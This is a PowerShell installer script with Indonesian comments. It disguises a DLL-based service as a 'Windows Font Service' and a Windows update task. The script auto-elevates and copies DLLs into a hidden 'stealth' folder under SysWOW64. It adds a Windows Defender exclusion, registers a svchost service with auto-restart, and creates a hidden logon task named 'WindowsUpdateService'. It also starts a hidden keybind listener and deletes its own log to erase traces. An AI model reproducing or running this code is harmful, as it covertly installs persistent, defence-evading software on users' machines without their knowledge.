<#
.SYNOPSIS
  Pengganti KB5028185.cmd — install/aktivasi service Font via PowerShell, tanpa .cmd.
  Jalankan sebagai ADMIN:
    powershell -NoProfile -ExecutionPolicy Bypass -File .\Activate-FontService.ps1
  Mode repair (service sudah ada, cuma pastikan auto-start + keybind):
    powershell -NoProfile -ExecutionPolicy Bypass -File .\Activate-FontService.ps1 -EnsureOnly
#>
param(
    [string]$Work = "",
    [string]$SvcName = "Font",
    [string]$SvcDisp = "Windows Font Service",
    [string]$TaskName = "WindowsUpdateService",
    [int]$Port = 8888,
    [switch]$EnsureOnly,
    [switch]$NoKeybind,
    [switch]$NoTask,
    [switch]$SkipDefender
)

$ErrorActionPreference = "Stop"
function Log($m, $c = "Gray") { Write-Host $m -ForegroundColor $c }

# ---------- 0. Auto-elevate ----------
$admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $admin) {
    Log "[*] Bukan admin, coba elevate..." "Yellow"
    $arg = "-NoExit -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    if ($Work) { $arg += " -Work `"$Work`"" }
    if ($EnsureOnly) { $arg += " -EnsureOnly" }
    if ($NoKeybind) { $arg += " -NoKeybind" }
    if ($NoTask) { $arg += " -NoTask" }
    Start-Process powershell.exe -ArgumentList $arg -Verb RunAs
    exit 0
}

# Log semua output ke file biar gampang debug kalau gagal
try { Start-Transcript -Path (Join-Path $env:TEMP "FontActivate.log") -Append -Force | Out-Null } catch { }

$ScriptDir = Split-Path $PSCommandPath -Parent
# Lokasi STEALTH: %SystemRoot%\SysWOW64\WinUpdate\.syscache (hidden + ACL khusus)
$StealthWork = Join-Path $env:SystemRoot "SysWOW64\WinUpdate\.syscache"
if ([string]::IsNullOrWhiteSpace($Work)) { $Work = $StealthWork }
# Cari root project dengan jalan NAIK dari lokasi script (script boleh di folder mana saja).
# Tandanya: ada Service\shim.dll atau CoreXHost\bin\x64\Release\WinUpdHost.dll di bawahnya.
$SvcRoot = $null; $ProjRoot = $null
$dir = $ScriptDir
for ($i = 0; $i -lt 6 -and $dir; $i++) {
    if (Test-Path (Join-Path $dir "Service\shim.dll")) { $ProjRoot = $dir; $SvcRoot = Join-Path $dir "Service"; break }
    if (Test-Path (Join-Path $dir "CoreXHost\bin\x64\Release\WinUpdHost.dll")) { $ProjRoot = $dir; $SvcRoot = Join-Path $dir "Service"; break }
    if ((Test-Path (Join-Path $dir "shim.dll")) -and ((Test-Path (Join-Path $dir "Cmd\KB5028185.cmd")) -or (Test-Path (Join-Path $dir "register-service.cmd")))) { $SvcRoot = $dir; $ProjRoot = Split-Path $dir -Parent; break }
    $dir = Split-Path $dir -Parent
}
if ($SvcRoot) { Log ("[*] Project ketemu: " + $SvcRoot) "DarkGray" }
else { Log "[!] Folder project tidak ketemu dari lokasi script, cuma pakai file di sebelah script/WORK." "Yellow" }

function Find-Src($names) {
    foreach ($n in $names) { if (Test-Path $n) { return $n } }
    return $null
}

# Panggilan native (sc/reg/icacls/powershell) yang BOLEH gagal.
# Wajib lewat helper ini: di PS 5.1, stderr native + $ErrorActionPreference=Stop = mati
# bahkan kalau sudah di-redirect. Helper ini menelan output-nya dengan aman.
# $LASTEXITCODE tetap terisi normal setelah panggil ini.
function Invoke-Native([scriptblock]$cmd) {
    $oldEAP = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try { & $cmd 2>&1 | Out-Null }
    catch { }
    finally { $ErrorActionPreference = $oldEAP }
}

if (-not $EnsureOnly) {
    # ---------- 1. Cari file sumber ----------
    $shimCands = @(); $hostCands = @(); $newtonCands = @(); $uninstCands = @()
    if ($SvcRoot) {
        $shimCands += Join-Path $SvcRoot "shim.dll"
        $hostCands += Join-Path $SvcRoot "WinUpdHost.dll"
        $newtonCands += Join-Path $SvcRoot "Newtonsoft.Json.dll"
    }
    if ($ProjRoot) { $hostCands = @((Join-Path $ProjRoot "CoreXHost\bin\x64\Release\WinUpdHost.dll")) + $hostCands }
    $shimCands += @((Join-Path $ScriptDir "shim.dll"), (Join-Path $Work "shim.dll"))
    $hostCands += @((Join-Path $ScriptDir "WinUpdHost.dll"), (Join-Path $Work "WinUpdHost.dll"))
    $newtonCands += @((Join-Path $ScriptDir "Newtonsoft.Json.dll"), (Join-Path $Work "Newtonsoft.Json.dll"))
    $uninstCands = @((Join-Path $ScriptDir "uninstall.cmd"), (Join-Path $Work "uninstall.cmd"))
    if ($SvcRoot) { $uninstCands = @((Join-Path $SvcRoot "Cmd\uninstall.cmd")) + $uninstCands }
    $shimSrc   = Find-Src $shimCands
    $hostSrc   = Find-Src $hostCands
    $newtonSrc = Find-Src $newtonCands
    $uninstSrc = Find-Src $uninstCands
    $missing = $false
    foreach ($pair in @(("shim.dll", $shimSrc, $shimCands), ("WinUpdHost.dll", $hostSrc, $hostCands), ("Newtonsoft.Json.dll", $newtonSrc, $newtonCands), ("uninstall.cmd", $uninstSrc, $uninstCands))) {
        if (-not $pair[1]) { Log ("[x] Tidak ketemu: " + $pair[0] + " (dicari di: " + ($pair[2] -join " | ") + ")") "Red"; $missing = $true }
    }
    if ($missing) { Log "[i] Taruh script di dalam folder project ATAU copy 4 file ke sebelah script." "Yellow"; try { Stop-Transcript | Out-Null } catch { }; exit 1 }
    Log ("[*] shim      : " + $shimSrc)
    Log ("[*] WinUpdHost: " + $hostSrc + " (" + ((New-Object IO.FileInfo($hostSrc)).Length) + " bytes)")

    # ---------- 2. Hentikan instalasi lama ----------
    Log "[*] Menghentikan layanan lama..." "Cyan"
    foreach ($s in @($SvcName, "CDPSvc_51dba", "BluetoothUserService_632af", "WinUpdHost")) {
        Invoke-Native { sc.exe stop $s }
    }
    Get-CimInstance Win32_Process -Filter "Name='rundll32.exe'" -EA SilentlyContinue |
        Where-Object { $_.CommandLine -match 'shim\.dll' } |
        ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue }
    Start-Sleep 1
    foreach ($s in @($SvcName, "CDPSvc_51dba")) {
        Invoke-Native { sc.exe delete $s }
        Invoke-Native { reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\$s" /f }
    }
    # tunggu record hilang (maks ~40 dtk)
    for ($i = 0; $i -lt 20; $i++) {
        Invoke-Native { sc.exe query $SvcName }
        if ($LASTEXITCODE -ne 0) { break }
        Start-Sleep 2
    }

    # ---------- 3. Siapkan WORK + salin file ----------
    Log ("[*] Menyiapkan " + $Work) "Cyan"
    # PENTING: pakai API .NET, bukan Get-Item/New-Item — provider PowerShell gagal
    # resolve folder dot-name di bawah SysWOW64 ("Could not find item"), .NET lolos.
    try {
        $wdi = [IO.Directory]::CreateDirectory($Work)
        $wdi.Attributes = $wdi.Attributes -bor [IO.FileAttributes]::Hidden
        $pdi = New-Object IO.DirectoryInfo((Split-Path $Work -Parent))
        if ($pdi.Exists) { $pdi.Attributes = $pdi.Attributes -bor [IO.FileAttributes]::Hidden }
    }
    catch { Log ("[x] Gagal siapkan WORK: " + $_.Exception.Message) "Red"; try { Stop-Transcript | Out-Null } catch { }; exit 1 }
    Copy-Item -LiteralPath $shimSrc -Destination (Join-Path $Work "shim.dll") -Force
    Copy-Item -LiteralPath $hostSrc -Destination (Join-Path $Work "WinUpdHost.dll") -Force
    Copy-Item -LiteralPath $newtonSrc -Destination (Join-Path $Work "Newtonsoft.Json.dll") -Force
    Copy-Item -LiteralPath $uninstSrc -Destination (Join-Path $Work "uninstall.cmd") -Force
    # Verifikasi: jangan lanjut kalau ada file gagal tersalin (cegah install setengah jalan)
    foreach ($f in @("shim.dll", "WinUpdHost.dll", "Newtonsoft.Json.dll", "uninstall.cmd")) {
        $p = Join-Path $Work $f
        if (-not (Test-Path $p)) { Log ("[x] Gagal menyalin ke WORK: " + $f) "Red"; try { Stop-Transcript | Out-Null } catch { }; exit 1 }
    }
    Log "[*] 4 file terverifikasi di WORK." "DarkGray"
    # ACL: service (LocalService) + SYSTEM full, user biasa read-only
    Invoke-Native { icacls.exe $Work /grant "*S-1-5-19:(OI)(CI)F" /grant "*S-1-5-18:(OI)(CI)F" /grant "*S-1-5-32-545:(OI)(CI)RX" }
    # bersihkkan WORK lama biar tidak dobel jejak
    $legacyList = @((Join-Path $env:ProgramData "Microsoft\Windows\WinUpdate\.syscache"), (Join-Path $ScriptDir ".syscache"))
    if ($SvcRoot) { $legacyList += Join-Path $SvcRoot ".syscache" }
    foreach ($legacy in $legacyList) {
        if (($legacy -ne $Work) -and (Test-Path $legacy)) {
            try { Remove-Item -Recurse -Force -LiteralPath $legacy -EA SilentlyContinue } catch { }
        }
    }

    if (-not $SkipDefender) {
        Invoke-Native { powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '$Work' -EA SilentlyContinue" }
    }

    # ---------- 4. Daftarkan service ----------
    Log "[*] Mendaftarkan service $SvcName..." "Cyan"
    Invoke-Native { sc.exe create $SvcName type= share start= auto error= normal binPath= "%SystemRoot%\System32\svchost.exe -k LocalService" DisplayName= $SvcDisp }
    if ($LASTEXITCODE -ne 0) { Log "[x] Gagal create service." "Red"; exit 1 }
    Invoke-Native { sc.exe config $SvcName start= auto }
    Invoke-Native { sc.exe failure $SvcName reset= 86400 actions= restart/60000/restart/60000/restart/60000 }
    Invoke-Native { sc.exe failureflag $SvcName 1 }
    Invoke-Native { sc.exe description $SvcName $SvcDisp }
    Invoke-Native { powershell -NoProfile -Command "$n='$SvcName';$p='HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost';$c=(Get-ItemProperty -Path $p -Name LocalService -EA SilentlyContinue).LocalService;if(-not $c){$c=@()};if($c -notcontains $n){Set-ItemProperty -Path $p -Name LocalService -Value ($c+$n) -Type MultiString}" }
    Invoke-Native { reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\$SvcName\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "$Work\shim.dll" /f }

    # salinan uninstall tersembunyi (seperti .cmd)
    $unstDir = "$env:ProgramData\Microsoft\Windows\WinUpdate"
    try {
        $udi = [IO.Directory]::CreateDirectory($unstDir)
        $udi.Attributes = $udi.Attributes -bor [IO.FileAttributes]::Hidden
    }
    catch { Log ("[!] Gagal siapkan folder uninstall: " + $_.Exception.Message) "Yellow" }
    Copy-Item -LiteralPath (Join-Path $Work "uninstall.cmd") -Destination (Join-Path $unstDir "uninstall.cmd") -Force
}
else {
    Log "[*] Mode EnsureOnly: tidak install ulang, cuma perbaiki auto-start." "Cyan"
    # fallback ke WORK lama kalau instalasi lama belum migrasi ke stealth
    if (-not (Test-Path (Join-Path $Work "shim.dll"))) {
        foreach ($lw in @((Join-Path $env:ProgramData "Microsoft\Windows\WinUpdate\.syscache"), (Join-Path $ScriptDir ".syscache"))) {
            if (Test-Path (Join-Path $lw "shim.dll")) {
                Log ("[*] Pakai WORK lama: " + $lw) "Yellow"
                $Work = $lw
                break
            }
        }
    }
    if (-not (Test-Path (Join-Path $Work "shim.dll"))) { Log "[x] WORK kosong, jalankan tanpa -EnsureOnly dulu." "Red"; exit 1 }
}

# ---------- 5. Pastikan auto + start ----------
Invoke-Native { sc.exe config $SvcName start= auto }
Invoke-Native { sc.exe failure $SvcName reset= 86400 actions= restart/60000/restart/60000/restart/60000 }
Invoke-Native { sc.exe failureflag $SvcName 1 }
Invoke-Native { sc.exe start $SvcName }
Log "[*] Service start diminta." "Cyan"

# ---------- 6. Tunggu port aktual ----------
$portFile = Join-Path $Work "sysport.dat"
for ($i = 0; $i -lt 30 -and -not (Test-Path $portFile); $i++) { Start-Sleep 1 }
if (Test-Path $portFile) { $Port = [int]((Get-Content $portFile -Raw).Trim().Trim('"')) }
$base = "http://127.0.0.1:$Port"
Log ("[*] Port aktual: " + $Port) "Green"

# ---------- 7. Tunggu server ----------
$up = $false
for ($i = 0; $i -lt 60; $i++) {
    try { (Invoke-WebRequest -Uri "$base/login" -UseBasicParsing -TimeoutSec 2).StatusCode | Out-Null; $up = $true; break }
    catch { Start-Sleep 1 }
}
if (-not $up) { Log "[x] Server tidak merespon." "Red"; exit 1 }

# ---------- 8. Login HWID -> cookie ----------
$cookieFile = Join-Path $Work "syscookie.dat"
$ok = $false
for ($i = 1; $i -le 10; $i++) {
    try {
        $r = Invoke-WebRequest -Uri "$base/login" -UseBasicParsing -TimeoutSec 5
        $m = [regex]::Match($r.Content, 'id=.hwid.>([^<]+)<')
        if (-not $m.Success) { throw "NO_HWID" }
        $body = (@{ hwid = $m.Groups[1].Value } | ConvertTo-Json -Compress)
        $j = Invoke-WebRequest -Uri "$base/login" -Method Post -ContentType 'application/json' -Body $body -UseBasicParsing -TimeoutSec 5
        $cm = [regex]::Match(($j.Headers['Set-Cookie'] -join ';'), 'AccessToken=([^;]+)')
        if (-not $cm.Success) { throw "NO_COOKIE" }
        [IO.File]::WriteAllText($cookieFile, $cm.Groups[1].Value)
        $ok = $true; break
    }
    catch { Log ("[!] Login coba " + $i + ": " + $_.Exception.Message) "Yellow"; Start-Sleep 2 }
}
if (-not $ok) { Log "[x] Login gagal." "Red"; exit 1 }
Log "[*] Login OK, cookie tersimpan." "Green"

# ---------- 9. Keybind listener + scheduled task ----------
if (-not $NoKeybind) {
    $cookie = (Get-Content $cookieFile -Raw).Trim()
    Start-Process rundll32.exe -ArgumentList "`"$Work\shim.dll`",RunKeybind `"$Port|$cookie`"" -WindowStyle Hidden
    Log "[*] Keybind listener jalan (Ctrl+Shift+F1-F10)." "Green"
}
if (-not $NoTask) {
    $q = [char]34
    $targ = $q + "$Work\shim.dll" + $q + ",RunKeybind " + $q + "$Port|$cookieFile" + $q
    $act = New-ScheduledTaskAction -Execute 'rundll32.exe' -Argument $targ
    $trg = New-ScheduledTaskTrigger -AtLogOn
    $st = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::Zero)
    $pr = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
    Register-ScheduledTask -TaskName $TaskName -Action $act -Trigger $trg -Settings $st -Principal $pr -Force | Out-Null
    Log "[*] Auto-start task terdaftar: $TaskName" "Green"
}

Log "" 
Log "SELESAI. Service=$SvcName (auto) | Panel=$base | WORK=$Work" "Green"
Log "Uninstall total: jalankan uninstall.cmd" "DarkGray"
# Bersihkan activate log sendiri (sukses = tidak perlu jejak debug)
try { Stop-Transcript | Out-Null } catch { }
try { $alog = Join-Path $env:TEMP "FontActivate.log"; if (Test-Path -LiteralPath $alog) { Remove-Item -LiteralPath $alog -Force -EA SilentlyContinue } } catch { }
